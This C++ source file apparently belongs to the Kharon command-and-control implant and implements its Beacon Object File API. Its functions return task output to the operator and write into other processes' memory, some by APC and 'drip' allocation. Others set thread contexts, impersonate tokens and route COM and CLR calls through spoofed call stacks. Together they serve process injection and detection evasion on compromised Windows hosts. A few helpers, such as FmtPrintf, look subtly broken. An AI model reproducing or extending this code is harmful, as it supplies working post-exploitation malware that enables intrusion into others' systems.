#include <Kharon.h>

auto DECLFN Coff::DataParse(
    DATAP* parser, 
    PCHAR  buffer, 
    INT    size
) -> VOID {
    G_KHARON

    if (parser == NULL) {
        return;
    }

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer   += 4;
}

auto DECLFN Coff::Output( 
    INT  type, 
    PCCH data, 
    INT  len
) -> VOID {
    G_KHARON

    VOID* MemRange  = __builtin_return_address( 0 );
    ULONG CommandID = 0;
    CHAR* UUID      = nullptr;

    CommandID = Self->Cf->GetCmdID( MemRange );
    UUID      = Self->Cf->GetTask( MemRange );
    
    Self->Pkg->SendOut( UUID, CommandID, (BYTE*)data, len, type );
}

auto DECLFN Coff::Printf(
    INT  type,
    PCCH fmt,
    ...
) -> VOID {
    G_KHARON

    va_list VaList = { 0 };
    va_start( VaList, fmt );

    VOID* MemRange = __builtin_return_address( 0 );
    CHAR* UUID     = nullptr;
    ULONG MsgSize  = 0;
    CHAR* MsgBuff  = nullptr;
    
    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
    if ( MsgSize < 0 ) {
        KhDbg( "failed get the formated message size" ); goto _KH_END;
    }

    MsgBuff = (CHAR*)Self->Hp->Alloc( MsgSize +1 );

    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, fmt, VaList ) < 0 ) {
        KhDbg( "failed formating string" ); goto _KH_END;
    }

    UUID = Self->Cf->GetTask( MemRange );

    KhDbg( "Message to send to the task id %s: %s [%d bytes]", UUID, MsgBuff, MsgSize );

    Self->Pkg->SendMsg( UUID, MsgBuff, type );

_KH_END:
    if ( VaList  ) va_end( VaList );
    if ( MsgBuff ) Self->Hp->Free( MsgBuff );
}

auto DECLFN Coff::DataExtract(
    DATAP* parser, 
    PINT   size
) -> PCHAR {
    G_KHARON
    return (PCHAR)Self->Psr->Bytes( (PPARSER)parser, (ULONG*)size );
}

auto DECLFN Coff::DataInt(
    DATAP* parser
)-> INT {
    G_KHARON
    return Self->Psr->Int32( (PPARSER)parser );
}

auto DECLFN Coff::DataShort(
    DATAP* parser
) -> SHORT {
    G_KHARON
    return Self->Psr->Int16( (PPARSER)parser );
}

auto DECLFN Coff::DataLength(
    DATAP* parser
) -> INT32 {
    return parser->length;
}

auto DECLFN Coff::FmtAlloc(
    FMTP*  Fmt,
    INT32  Maxsz
) -> VOID {
    G_KHARON

    if ( !Fmt ) return;

    Fmt->original = (CHAR*)Self->Hp->Alloc( Maxsz );
    Fmt->buffer   = Fmt->original;
    Fmt->length   = 0;
    Fmt->size     = Maxsz;
}

auto DECLFN Coff::FmtReset(
    FMTP* Fmt
) -> VOID {
    Mem::Zero( (UPTR)Fmt->original, Fmt->size );
    Fmt->buffer = Fmt->original;
    Fmt->length = Fmt->size;
}

auto DECLFN Coff::FmtAppend(
    FMTP* Fmt,
    CHAR* Data,
    INT32 Len
) -> VOID {
    Mem::Copy( Fmt->buffer, Data, Len );
    Fmt->buffer += Len;
    Fmt->length += Len;
}

auto DECLFN Coff::FmtPrintf(
    FMTP* Fmt,
    CHAR* Data,
    ...
) -> VOID {
    G_KHARON

    va_list Args = { 0 };
    INT32   Len  = 0;

    va_start( Args, Data );
    Len = Self->Msvcrt.vsnprintf( Fmt->buffer, Len, Data, Args );
    va_end( Args );

    Fmt->buffer += Len;
    Fmt->length += Len;
}

auto DECLFN Coff::FmtInt(
    FMTP* Fmt,
    INT32 Val
) -> VOID {
    if ( Fmt->length + 4 > Fmt->size ) return;

    Mem::Copy( Fmt->buffer, &Val, 4 );
    Fmt->buffer += 4;
    Fmt->length += 4;
    return;
}

auto DECLFN Coff::IsAdmin( VOID ) -> BOOL {
    G_KHARON

    return Self->Session.Elevated;
}

auto DECLFN Coff::GetSpawn(
    BOOL  x86, 
    CHAR* buffer, 
    INT32 length
)-> VOID {
    G_KHARON

    if ( !buffer ) return;

    // return Self->Ps->Ctx
}

auto DECLFN Coff::FmtFree(
    FMTP* Fmt
)-> VOID {
    G_KHARON

    if ( !Fmt ) return;

    if ( Fmt->original ) {
        Self->Hp->Free( Fmt->original );
        Fmt->original = nullptr;
    }
    
    Fmt->buffer = nullptr;
    Fmt->length = Fmt->size = 0;
}

auto DECLFN Coff::OpenProcess(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD processId
) -> HANDLE {
    G_KHARON
    return Self->Ps->Open( desiredAccess, inheritHandle, processId );
}

auto DECLFN Coff::WriteProcessMemory(
    HANDLE hProcess, 
    PVOID  BaseAddress, 
    PVOID  Buffer, 
    SIZE_T Size,  
    SIZE_T *Written
)->BOOL {
    G_KHARON
    return Self->Mm->Write( BaseAddress, (BYTE*)Buffer, Size, Written, hProcess );
}

auto DECLFN Coff::ReadProcessMemory(
    HANDLE hProcess, 
    PVOID  BaseAddress, 
    PVOID  Buffer,  
    SIZE_T Size,  
    SIZE_T *Read
)->BOOL {
    G_KHARON
    return Self->Mm->Read( BaseAddress, (BYTE*)Buffer, Size, Read, hProcess );
}

auto DECLFN Coff::VirtualAlloc(
    PVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect );
}

auto DECLFN Coff::VirtualAllocEx(
    HANDLE Handle,
    PVOID  Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
}

auto DECLFN Coff::VirtualProtect(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON
    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
}

auto DECLFN Coff::VirtualProtectEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON
    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect, Handle );
}

auto DECLFN Coff::OpenThread(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD threadId
) -> HANDLE {
    G_KHARON
    return Self->Td->Open( desiredAccess, inheritHandle, threadId );
}

auto DECLFN Coff::LoadLibraryA(
    CHAR* LibraryName
) -> HMODULE {
    G_KHARON
    return (HMODULE)Self->Lib->Load( LibraryName );
}

auto DECLFN Coff::LoadLibraryW(
    WCHAR* LibraryName
) -> HMODULE {
    G_KHARON

    if (LibraryName == nullptr)
        return nullptr;

    CHAR LibA[MAX_PATH] = { 0 };
    Str::WCharToChar( LibA, LibraryName, MAX_PATH );

    return (HMODULE)Self->Lib->Load( LibA );
}

auto DECLFN Coff::DriAlloc(
    SIZE_T Size, 
    ULONG  Protect, 
    HANDLE Handle
) -> PVOID {
    G_KHARON

    return Self->Mm->DripAlloc( Size, Protect, Handle );
}

auto DECLFN Coff::WriteApc(
    HANDLE Handle, 
    PVOID  Base, 
    BYTE*  Buffer, 
    ULONG  Size
) -> BOOL {
    G_KHARON

    return Self->Mm->WriteAPC( Handle, Base, Buffer, Size );
}

auto DECLFN Coff::CLRCreateInstance(
    REFCLSID clsid, REFIID riid, LPVOID* ppInterface
) -> HRESULT {
    G_KHARON

    if (!ppInterface) {
        return E_POINTER;
    }

    if ( Self->Spf->Enabled ) {
        struct GUID_PACK {
            UPTR part1;
            UPTR part2;
        };
        
        GUID_PACK clsid_pack = {
            *reinterpret_cast<const UPTR*>(&clsid.Data1),
            *reinterpret_cast<const UPTR*>(&clsid.Data2)
        };
        
        GUID_PACK riid_pack = {
            *reinterpret_cast<const UPTR*>(&riid.Data1),
            *reinterpret_cast<const UPTR*>(&riid.Data2)
        };

        return static_cast<HRESULT>(Self->Spf->Call(
            reinterpret_cast<UPTR>(Self->Mscoree.CLRCreateInstance),
            clsid_pack.part1,
            clsid_pack.part2,
            reinterpret_cast<UPTR>(&clsid.Data3),
            reinterpret_cast<UPTR>(clsid.Data4),
            riid_pack.part1,
            riid_pack.part2,
            reinterpret_cast<UPTR>(&riid.Data3),
            reinterpret_cast<UPTR>(riid.Data4),
            reinterpret_cast<UPTR>(ppInterface)
        ));
    } else {
        return Self->Mscoree.CLRCreateInstance(
            clsid,
            riid,
            ppInterface
        );
    }
}

auto DECLFN Coff::SetThreadContext(
    HANDLE   Handle,
    CONTEXT* Ctx
) -> BOOL {
    G_KHARON
    return Self->Td->SetCtx( Handle, Ctx );
}

auto DECLFN Coff::GetThreadContext(
    HANDLE   Handle,
    CONTEXT* Ctx
) -> BOOL {
    G_KHARON
    return Self->Td->GetCtx( Handle, Ctx );
}

auto DECLFN Coff::CoInitialize(
    LPVOID pvReserved
) -> HRESULT {
    G_KHARON
    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitialize, 0, (UPTR)pvReserved );
}

auto DECLFN Coff::CoInitializeEx(
    LPVOID pvReserved,
    DWORD  dwCoInit
) -> HRESULT {
    G_KHARON
    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
}

auto Coff::UseToken(
    HANDLE token
) -> BOOL {
    G_KHARON

    return Self->Tkn->Use( token );
}

auto Coff::RevertToken(
    VOID
) -> VOID {
    G_KHARON

    Self->Tkn->Rev2Self();
}

auto Coff::RmValue(
    PCCH key
) -> BOOL {
    G_KHARON

    if ( ! Self->Cf->UserData ) return FALSE;

    VALUE_DICT* Prev    = nullptr;
    VALUE_DICT* Current = Self->Cf->UserData;

    while ( Current ) {
        if ( Str::CompareA( Current->Key, key ) == 0) {
            if (!Prev) {
                Self->Cf->UserData = Current->Next;
            } else {
                Prev->Next = Current->Next;
            }

            Self->Hp->Free( Current->Key );
            Self->Hp->Free( Current );
            
            return TRUE;
        }

        Prev    = Current;
        Current = Current->Next;
    }

    return FALSE;
}

auto Coff::AddValue(
    PCCH  key, 
    PVOID ptr
) -> BOOL {
    G_KHARON

    if ( !key || Self->Cf->GetValue( key ) ) return FALSE;

    VALUE_DICT* NewData = (VALUE_DICT*)Self->Hp->Alloc( sizeof( VALUE_DICT ) );
    if ( ! NewData ) return FALSE;
    
    size_t keyLen = Str::LengthA( key );
    NewData->Key  = (CHAR*)Self->Hp->Alloc( keyLen + 1 );
    if ( ! NewData->Key) {
        Self->Hp->Free(NewData);
        return FALSE;
    }

    Mem::Copy( NewData->Key, (PVOID)key, keyLen );
    NewData->Key[keyLen] = '\0';
    NewData->Ptr = ptr;

    if ( ! Self->Cf->UserData ) {
        Self->Cf->UserData = NewData;
    } else {
        VALUE_DICT* Tail = Self->Cf->UserData;
        while ( Tail->Next ) {
            Tail = Tail->Next;
        }
        Tail->Next = NewData;
    }

    return TRUE;
}

auto Coff::GetValue(
    PCCH key
) -> PVOID {
    G_KHARON

    if ( ! key || ! Self->Cf->UserData ) return nullptr;

    VALUE_DICT* Current = Self->Cf->UserData;
    while ( Current ) {
        if ( Current->Key && Str::CompareA( Current->Key, key ) == 0 ) {
            return Current->Ptr;
        }
        Current = Current->Next;
    }
    
    return nullptr;
}
